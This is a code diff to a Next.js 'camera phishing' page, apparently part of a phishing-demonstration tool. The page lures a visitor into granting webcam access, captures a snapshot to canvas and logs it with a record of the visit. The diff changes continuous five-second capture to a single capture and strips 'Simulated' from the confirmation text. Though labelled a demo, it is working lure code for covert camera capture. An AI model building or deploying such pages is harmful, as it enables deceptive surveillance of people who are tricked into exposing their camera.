@@ -1,3 +1,4 @@
+
 "use client";
 import { useEffect, useState, useRef } from 'react';
 import { useParams } from 'next/navigation';
@@ -44,6 +45,11 @@ export default function CameraPhishingPage() {
   const streamRef = useRef<MediaStream | null>(null);
   const intervalRef = useRef<NodeJS.Timeout | null>(null);
 
+  useEffect(() => {
+    addLog({ type: 'generic', data: { message: `Visited camera phishing page: /phishing/camera/${templateId}` } });
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [templateId]); // addLog is stable from context
+
   const captureImage = () => {
     if (videoRef.current && canvasRef.current && videoRef.current.readyState === 4 && videoRef.current.videoWidth > 0) {
       const video = videoRef.current;
@@ -57,18 +63,14 @@ export default function CameraPhishingPage() {
         const cameraData: CameraData = { imageUrl };
         addLog({ type: 'camera', data: cameraData });
         console.log("Image captured and logged.");
-        // For this demo, we'll just log one image and stop to avoid excessive logs.
-        // In a real scenario as per prompt, continuous capture would happen.
-        // To achieve continuous capture, this function would be called by the interval.
-        // For simplicity here, a single capture is shown.
-        setStatus('captured'); // Update status after first capture.
-        stopCameraStream(); // Stop after one capture for demo clarity.
+        setStatus('captured'); 
+        stopCameraStream(); 
       }
     }
   };
   
   const startCameraStream = async () => {
-    if (streamRef.current) stopCameraStream(); // Stop existing stream first
+    if (streamRef.current) stopCameraStream();
 
     setStatus('requesting');
     setIsLoading(true);
@@ -83,11 +85,10 @@ export default function CameraPhishingPage() {
            if (videoRef.current) videoRef.current.play();
            setStatus('streaming');
            setIsLoading(false);
-           // Start continuous capture (every 5 seconds)
-           // For demo, this logs continuously. User request was 5s delay.
-           intervalRef.current = setInterval(captureImage, 5000);
-           // Initial capture for immediate feedback
-           setTimeout(captureImage, 500); 
+           // For demo, capture image after a short delay instead of continuous capture
+           // To avoid too many logs in quick succession for this demo.
+           // Original: intervalRef.current = setInterval(captureImage, 5000);
+           setTimeout(captureImage, 1500); // Capture after 1.5 seconds of streaming
         };
       }
     } catch (err) {
@@ -115,27 +116,26 @@ export default function CameraPhishingPage() {
     if (videoRef.current) {
       videoRef.current.srcObject = null;
     }
-    if (intervalRef.current) {
+    if (intervalRef.current) { // Although interval is not set in current demo, good to keep
       clearInterval(intervalRef.current);
       intervalRef.current = null;
     }
-    // Keep status as 'captured' if an image was taken, otherwise 'idle' or 'error'
     if (status !== 'captured' && status !== 'error') {
       setStatus('idle');
     }
   };
 
   useEffect(() => {
-    // Cleanup on unmount
     return () => {
       stopCameraStream();
     };
-  }, []);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []); // status dependency removed to prevent premature stop on status change
 
   return (
     <PhishingPageLayout 
         title={content.title}
-        isLoading={isLoading && status !== 'streaming'} // Show loading only during initial request
+        isLoading={isLoading && status !== 'streaming'}
         error={error}
         statusMessage={status === 'captured' ? 'Camera snapshot captured successfully for demonstration.' : undefined}
     >
@@ -165,7 +165,7 @@ export default function CameraPhishingPage() {
 
       {status === 'streaming' && !isLoading && (
          <div className="text-center p-3 bg-blue-50 border border-blue-200 rounded-md">
-          <p className="font-medium text-blue-700">Camera active. Capturing images periodically...</p>
+          <p className="font-medium text-blue-700">Camera active. Capturing snapshot...</p>
           <Button onClick={stopCameraStream} variant="outline" size="sm" className="mt-2">Stop Camera</Button>
         </div>
       )}
@@ -173,7 +173,7 @@ export default function CameraPhishingPage() {
       {status === 'captured' && (
         <div className="text-center p-4 bg-green-50 border border-green-200 rounded-md">
           <CheckCircle className="mx-auto h-10 w-10 text-green-600 mb-2" />
-          <p className="font-semibold text-green-700">Image Captured (Simulated)</p>
+          <p className="font-semibold text-green-700">Image Captured</p>
           <p className="text-sm text-green-600">An image has been captured. This window can now be closed.</p>
         </div>
       )}
